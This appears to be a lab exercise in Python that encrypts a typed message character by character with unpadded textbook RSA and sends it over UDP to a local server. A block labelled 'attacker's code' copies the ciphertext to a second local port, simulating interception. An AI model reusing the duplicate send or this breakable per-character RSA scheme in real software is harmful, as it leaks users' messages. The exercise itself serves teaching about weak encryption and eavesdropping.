import socket

N = 15910596760311511967802161284357         #(p*q)
e = 35421826192615868656164957915281

bufferSize          = 4096
msgFromDhoni        = input()

message = ""
for i in range (0, len(msgFromDhoni)):
    message += str(pow(ord(msgFromDhoni[i]),e,N))+" "

bytesToSend         = str.encode(message)
serverAddressPort   = ("127.0.0.1", 21603)

UDPClientSocket = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
UDPClientSocket.sendto(bytesToSend, serverAddressPort)

# attacker's code
attackerAddressPort = ("127.0.0.1",30000)
UDPClientSocket = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
UDPClientSocket.sendto(bytesToSend, attackerAddressPort)



